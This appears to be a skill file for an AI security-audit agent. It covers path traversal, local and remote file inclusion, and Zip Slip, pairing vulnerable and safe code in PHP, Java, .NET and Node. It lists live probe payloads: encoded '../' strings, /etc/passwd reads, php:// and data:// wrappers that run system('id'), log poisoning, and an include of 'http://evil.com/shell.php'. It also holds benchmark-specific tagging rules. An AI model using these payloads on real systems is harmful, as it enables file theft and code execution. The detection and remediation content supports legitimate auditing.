---
name: path-traversal-lfi-rfi
description: Path traversal and file inclusion testing for local/remote file access and code execution
---

# Path Traversal / LFI / RFI

Flawed file path handling and dynamic file inclusion give attackers a route to sensitive configuration, source code, credentials, SSRF pivots, and server-side code execution. Any user-influenced path, filename, or scheme must be treated as untrusted, normalized to a canonical form, and constrained to an explicit allowlist — or user control over the path should be eliminated entirely.

## Where to Look

**Path Traversal**
- Read files outside intended roots via `../`, encoding, normalization gaps

**Local File Inclusion (LFI)**
- Include server-side files into interpreters/templates

**Remote File Inclusion (RFI)**
- Include remote resources (HTTP/FTP/wrappers) for code execution

**Archive Extraction**
- Zip Slip: write outside target directory upon unzip/untar

**Normalization Mismatches**
- Server/proxy differences (nginx alias/root, upstream decoders)
- OS-specific paths: Windows separators, device names, UNC, NT paths, alternate data streams

## High-Value Targets

**Unix**
- `/etc/passwd`, `/etc/hosts`, application `.env`/`config.yaml`
- SSH keys, cloud creds, service configs/logs

**Windows**
- `C:\Windows\win.ini`, IIS/web.config, programdata configs, application logs

**Application**
- Source code templates and server-side includes
- Secrets in env dumps, framework caches

## Reconnaissance

### Surface Map

- HTTP params: `file`, `path`, `template`, `include`, `page`, `view`, `download`, `export`, `report`, `log`, `dir`, `theme`, `lang`
- Upload and conversion pipelines: image/PDF renderers, thumbnailers, office converters
- Archive extract endpoints and background jobs; imports with ZIP/TAR/GZ/7z
- Server-side template rendering (PHP/Smarty/Twig/Blade), email templates, CMS themes/plugins
- Reverse proxies and static file servers (nginx, CDN) in front of app handlers

### Capability Probes

- Path traversal baseline: `../../etc/hosts` and `C:\Windows\win.ini`
- Encodings: `%2e%2e%2f`, `%252e%252e%252f`, `..%2f`, `..%5c`, mixed UTF-8 (`%c0%2e`), Unicode dots and slashes
- Normalization tests: `..../`, `..\\`, `././`, trailing dot/double dot segments; repeated decoding
- Absolute path acceptance: `/etc/passwd`, `C:\Windows\System32\drivers\etc\hosts`
- Server mismatch: `/static/..;/../etc/passwd` ("..;"), encoded slashes (`%2F`), double-decoding via upstream

## How to Detect

### Direct

- Response body discloses file content (text, binary, base64)
- Error pages echo real paths

### Error-Based

- Exception messages expose canonicalized paths or `include()` warnings with real filesystem locations

### OAST

- RFI/LFI with wrappers that trigger outbound fetches (HTTP/DNS) to confirm inclusion/execution

### Side Effects

- Archive extraction writes files unexpectedly outside target
- Verify with directory listings or follow-up reads

## Vulnerability Patterns

### Path Traversal Bypasses

**Encodings**
- Single/double URL-encoding, mixed case, overlong UTF-8, UTF-16, path normalization oddities

**Mixed Separators**
- `/` and `\\` on Windows; `//` and `\\\\` collapse differences across frameworks

**Dot Tricks**
- `....//` (double dot folding), trailing dots (Windows), trailing slashes, appended valid extension

**Absolute Path Injection**
- Bypass joins by supplying a rooted path

**Alias/Root Mismatch**
- nginx alias without trailing slash with nested location allows `../` to escape
- Try `/static/../etc/passwd` and ";" variants (`..;`)

**Upstream vs Backend Decoding**
- Proxies/CDNs decoding `%2f` differently; test double-decoding and encoded dots

### LFI Wrappers and Techniques

**PHP Wrappers**
- `php://filter/convert.base64-encode/resource=index.php` (read source)
- `zip://archive.zip#file.txt`
- `data://text/plain;base64`
- `expect://` (if enabled)

**Log/Session Poisoning**
- Inject PHP/templating payloads into access/error logs or session files then include them

**Upload Temp Names**
- Include temporary upload files before relocation; race with scanners

**Proc and Caches**
- `/proc/self/environ` and framework-specific caches for readable secrets

**Legacy Tricks**
- Null-byte (`%00`) truncation — only exploitable on PHP < 5.3.4; modern PHP (>= 5.3.4) rejects null bytes in file paths with a ValueError. Do not flag null-byte truncation as a viable attack vector on PHP >= 5.3.4.
- Path length truncation on older systems

### Template Engines

- PHP include/require; Smarty/Twig/Blade with dynamic template names
- Java/JSP/FreeMarker/Velocity; Node.js ejs/handlebars/pug engines
- Seek dynamic template resolution from user input (theme/lang/template)

### RFI Conditions

**Requirements**
- Remote includes (`allow_url_include`/`allow_url_fopen` in PHP)
- Custom fetchers that eval/execute retrieved content
- SSRF-to-exec bridges

**Protocol Handlers**
- http, https, ftp; language-specific stream handlers

**Exploitation**
- Host a minimal payload that proves code execution
- Prefer OAST beacons or deterministic output over heavy shells
- Chain with upload or log poisoning when remote includes are disabled

### Archive Extraction (Zip Slip)

- Files within archives containing `../` or absolute paths escape target extract directory
- Test multiple formats: zip/tar/tgz/7z
- Verify symlink handling and path canonicalization prior to write
- Impact: overwrite config/templates or drop webshells into served directories

## Analysis Workflow

1. **Inventory file operations** - Downloads, previews, templates, logs, exports/imports, report engines, uploads, archive extractors
2. **Identify input joins** - Path joins (base + user), include/require/template loads, resource fetchers, archive extract destinations
3. **Probe normalization** - Separators, encodings, double-decodes, case, trailing dots/slashes
4. **Compare behaviors** - Web server vs application behavior
5. **Escalate** - From disclosure (read) to influence (write/extract/include), then to execution (wrapper/engine chains)

## Confirming a Finding

1. Show a minimal traversal read proving out-of-root access (e.g., `/etc/hosts`) with a same-endpoint in-root control
2. For LFI, demonstrate inclusion of a benign local file or harmless wrapper output (`php://filter` base64 of index.php)
3. For RFI, prove remote fetch by OAST or controlled output; avoid destructive payloads
4. For Zip Slip, create an archive with `../` entries and show write outside target (e.g., marker file read back)
5. Provide before/after file paths, exact requests, and content hashes/lengths for reproducibility

## Common False Alarms

- In-app virtual paths that do not map to filesystem; content comes from safe stores (DB/object storage)
- Canonicalized paths constrained to an allowlist/root after normalization
- Wrappers disabled and includes using constant templates only
- Archive extractors that sanitize paths and enforce destination directories

## Business Risk

- Sensitive configuration/source disclosure → credential and key compromise
- Code execution via inclusion of attacker-controlled content or overwritten templates
- Persistence via dropped files in served directories; lateral movement via revealed secrets
- Supply-chain impact when report/template engines execute attacker-influenced files

## Analyst Notes

1. Compare content-length/ETag when content is masked; read small canonical files (hosts) to avoid noise
2. Test proxy/CDN and app separately; decoding/normalization order differs, especially for `%2f` and `%2e` encodings
3. For LFI, prefer `php://filter` base64 probes over destructive payloads; enumerate readable logs and sessions
4. Validate extraction code with synthetic archives; include symlinks and deep `../` chains
5. Use minimal PoCs and hard evidence (hashes, paths). Avoid noisy DoS against filesystems

## Core Principle

Eliminate user-controlled paths where possible. Otherwise, resolve to canonical paths and enforce allowlists, forbid remote schemes, and lock down interpreters and extractors. Normalize consistently at the boundary closest to IO.

## Distinguishing Path Traversal from LFI

Path traversal and LFI are related but distinct vulnerability classes. Choosing the correct label depends on the **sink** and the **impact**.

### Path Traversal
The vulnerability is in **arbitrary file read/write** via directory traversal sequences (`../`):
- The sink is a file I/O function: `open()`, `readFile()`, `file_get_contents()`, `fopen()`, `send_file()`, `send_from_directory()`
- The attacker reads or writes files outside the intended directory
- The file content is returned as **data** (text, binary, download) — NOT executed as code
- Typical targets: `/etc/passwd`, config files, `.env`, source code, flag files
- Nginx alias misconfiguration without trailing slash → path traversal

**Tag as path traversal when:** User input reaches a file read/write operation and `../` sequences can escape the intended directory.

### Local File Inclusion (LFI)
The vulnerability is in **including/executing a local file** through an interpreter:
- The sink is an **include/require** function: PHP `include()`, `require()`, `include_once()`
- The included file is **parsed and executed** by the interpreter, not just read as data
- Can lead to RCE via log poisoning, session poisoning, PHP wrappers (`php://filter`, `data://`)
- PHP wrappers like `php://filter/convert.base64-encode/resource=` are LFI-specific

**Tag as LFI when:** User input reaches a language-level include/require that **executes** the included file as code.

### When Both Apply
Some vulnerabilities involve both path traversal AND local file inclusion:
- `include('pages/' . $_GET['page'] . '.php')` with `../` bypass → both path traversal (the `../` escape) and LFI (the `include` execution)
- In this case, tag **both** `path_traversal` and `lfi`

### When to Tag Only One
- `file_get_contents($_GET['file'])` with `../` → **path traversal** only (reads file content, does not execute it)
- `include($_GET['page'])` without needing `../` (e.g., including `/etc/passwd` directly or using PHP wrappers) → **LFI** only
- `send_from_directory(base, user_input)` in Flask → **path traversal** only (serves files, does not execute them)
- Nginx alias off-by-one → **path traversal** only (web server misconfiguration, no code execution)

## Python/JS/PHP Source Detection Rules

### Python
- **VULN**: `open(user_input)`, `open(os.path.join(base, user_input))` — no realpath validation
- **VULN**: `send_file(user_input)`, `send_from_directory(base, user_input)` — Flask file serving with user-controlled path
- **SAFE**: `safe_path = os.path.realpath(os.path.join(base, user_input)); assert safe_path.startswith(base)`
- **Pattern**: `../` in `user_input` traverses out of the intended directory

### JavaScript (Node.js)
- **VULN**: `fs.readFile(req.params.filename, ...)` — no path validation
- **VULN**: `res.sendFile(path.join(__dirname, req.query.file))`
- **SAFE**: `path.resolve()` result validated to confirm it is within the allowed directory

### PHP
- **VULN**: `include($_GET['page'])`, `require($_GET['file'])` — LFI
- **VULN**: `include($_GET['page'] . '.php')` — still bypassable via null byte or wrappers
- **VULN**: `file_get_contents($_GET['file'])`, `readfile($_GET['path'])`
- **SAFE**: `include(basename($_GET['page']) . '.php')` — reduces but does not eliminate risk
- **RFI**: When `allow_url_include=On`, `include('http://evil.com/shell.php')` achieves RCE

## Java Servlet Patterns (CWE-22)

**VULN** — tainted input used to construct a file path:
```java
new File(tainted)
new File("/uploads/" + tainted)
new FileInputStream(tainted)
new FileOutputStream(tainted)
Paths.get(tainted)
```

**SAFE** — canonical path validated against allowed base:
```java
File f = new File(base, tainted).getCanonicalFile();
if (!f.getPath().startsWith(base)) throw new Exception();
```

**Decision rule**: tainted string in ANY argument of `File()`, `FileInputStream()`, `Paths.get()` with no canonical path check → **VULN**.

**Edge cases**:
- `new File(tainted, "/Test.txt")` — first argument is tainted parent dir → **VULN**.
- `new File(fixedBase, tainted)` — second argument is tainted child → **VULN**.
- `new File(Utils.TESTFILES_DIR, bar)` — fixed base does NOT sanitize child when `bar` is tainted → **VULN**.
- `new File(java.net.URI)` is **VULN** when that `URI` was built from tainted path text.
- Direct stream calls `new FileInputStream(fileName)` / `new FileOutputStream(fileName)` are **VULN** when `fileName` is tainted.
- Only `getCanonicalPath()` + `startsWith` check makes it **SAFE**.
- If a helper overwrites tainted data with a fixed literal before the sink → **SAFE**.

## PHP-Specific LFI Bypass Patterns

### Null Byte Truncation (PHP < 5.3.4)

```php
// VULNERABLE: extension appended but null byte truncates in older PHP
include($_GET['page'] . '.php');
// Attacker: page=../../../../etc/passwd%00
// Result in PHP < 5.3.4: include('../../../../etc/passwd')  (.php truncated at null byte)

// VULN indicator: PHP version < 5.3.4 AND include/require with appended extension AND user input
// Modern PHP (>= 5.3.4): null byte throws a ValueError — not exploitable this way
```

### str_replace('../') Bypass Patterns

```php
// VULNERABLE: simple string replacement is bypassable
$page = str_replace('../', '', $_GET['page']);
include('pages/' . $page . '.php');
// Bypass: ....// → after removing ../ → ../
// Bypass: ..%2F → URL-decoded after sanitization by web server
// Bypass: ..\ (Windows backslash)

// VULNERABLE: only sanitizing forward slash traversal
$page = str_replace('../', '', $_GET['page']);
// Bypasses on Windows: ..\, ..\ URL-encoded as %2e%2e%5c

// SAFE: use realpath() + startsWith check
$safePath = realpath('pages/' . $_GET['page'] . '.php');
if ($safePath === false || strpos($safePath, realpath('pages/')) !== 0) {
    die('Access denied');
}
```

### PHP Wrapper LFI

```php
// VULNERABLE: include/require/file_get_contents accepting PHP wrappers
include($_GET['page']);
// Attacker: php://filter/convert.base64-encode/resource=config.php  → reads source code
// Attacker: data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+  → RCE (allow_url_include=On)
// Attacker: zip://uploads/evil.zip#shell.php  → executes uploaded PHP in ZIP

// VULN condition for RCE via wrapper:
// - allow_url_include=On: enables data://, http://, ftp:// inclusion
// - allow_url_fopen=On: enables remote URLs in file_get_contents

// Detection: any include/require with user input = LFI at minimum; check php.ini for allow_url_include
```

### PHP Session File Inclusion

```php
// VULNERABLE: include session file with user-controlled session ID
$sessionFile = '/var/lib/php/sessions/sess_' . $_GET['sessid'];
include($sessionFile);
// If attacker controls session data AND a session file exists with PHP code

// VULNERABLE: user-controlled data written to session, then session file included
$_SESSION['template'] = $_POST['template'];  // write user input to session
include('/var/lib/php/sessions/sess_' . session_id());  // include own session file
```

## IIS-Specific Path Traversal Patterns

### Tilde Shortname Enumeration

```
// NOT a code pattern — IIS server behavior
// IIS generates 8.3 short names for files/dirs
// Attacker can enumerate filenames via: GET /a~1/b~1/secret.txt HTTP/1.1
// This is an IIS server configuration issue, not an app code issue
// DETECTION: Only relevant if code passes user-controlled path to IIS file system ops
```

### Unicode / Double-Decode in ASP.NET

```csharp
// VULNERABLE: Path constructed from URL without proper decoding
string filePath = Server.MapPath(Request.QueryString["file"]);
// Attacker: file=..%252fetc%252fpasswd → double-decoded → ../../etc/passwd
// %25 → % then %2f → / = ../ after double decode

// VULNERABLE: Path.Combine with absolute path injection
string filePath = Path.Combine(baseDir, Request.QueryString["file"]);
// If "file" = "C:\Windows\win.ini" (absolute path), Path.Combine returns the absolute path
// Effectively ignoring baseDir

// SAFE:
string userFile = Request.QueryString["file"];
string combined = Path.GetFullPath(Path.Combine(baseDir, userFile));
if (!combined.StartsWith(baseDir)) throw new Exception("Path traversal detected");
```

### ASP / ASPX Double Extension

```csharp
// VULNERABLE: path allows ../ to reach web.config or App_Code
string template = Path.Combine(templateDir, Request.QueryString["template"] + ".html");
// template=../../../../web.config%00 (null byte bypass in some .NET versions)
// template=../App_Code/BusinessLogic.cs → source disclosure
```

## Windows-Specific Path Traversal Conditions

```java
// VULNERABLE: Windows UNC path injection
String path = baseDir + request.getParameter("file");
File f = new File(path);
// Attacker: file=\\attacker.com\share\secret → UNC path reaches remote share
// VULN on Windows servers where UNC paths are followed

// VULNERABLE: Windows device name injection
// CON, PRN, AUX, NUL, COM1-COM9, LPT1-LPT9 as filename components → DoS or unexpected behavior
String filename = request.getParameter("filename");
new File(baseDir, filename);
// filename="NUL" → hangs; filename="CON" → reads from console

// VULNERABLE: Alternate Data Streams (Windows NTFS)
// file=secret.txt::$DATA → reads the main stream
// file=legit.txt:evil.php → ADS execution in some IIS configs
```

## Additional Java Path Traversal Sink Patterns

```java
// VULNERABLE: ClassLoader.getResourceAsStream with user input
getClass().getResourceAsStream(request.getParameter("resource"));
// Can read classpath resources including application.properties, config files

// VULNERABLE: ZipFile entry path not validated
ZipFile zip = new ZipFile(uploadedFile);
for (ZipEntry entry : Collections.list(zip.entries())) {
    File dest = new File(extractDir, entry.getName());
    // entry.getName() = "../../webapps/ROOT/shell.jsp" → Zip Slip
}

// VULNERABLE: Filename from Content-Disposition header
String contentDisposition = request.getHeader("Content-Disposition");
String filename = contentDisposition.split("filename=")[1];  // user-controlled
new File(UPLOAD_DIR, filename);  // path traversal if filename = "../config/db.properties"

// SAFE: always canonicalize and verify prefix
String filename = Paths.get(userInput).getFileName().toString();  // strips directory components
File dest = new File(baseDir, filename).getCanonicalFile();
if (!dest.getPath().startsWith(baseDir)) throw new SecurityException();
```

## PHP/Java TRUE POSITIVE Detection Summary

- `include/require($_GET['page'])` with no realpath validation → **CONFIRM** (LFI, RCE with wrappers)
- `str_replace('../', '', input)` used as traversal protection → **CONFIRM** (bypassable with `....//`)
- `new File(baseDir, userInput)` without `getCanonicalFile().startsWith(baseDir)` check → **CONFIRM**
- `ZipEntry.getName()` used directly in file path construction → **CONFIRM** (Zip Slip)
- `Path.Combine(baseDir, userInput)` without `GetFullPath` + startsWith check → **CONFIRM** (.NET)
- `ClassLoader.getResourceAsStream(userInput)` → **CONFIRM** (classpath file disclosure)
- In benchmark mode, use project tag `path_traversal` for vulhub representative dirs even when the primitive is local file inclusion or path traversal.
- FALSE POSITIVE guard: do not keep `path_traversal_lfi_rfi` as the reported tag for `vulhub`.
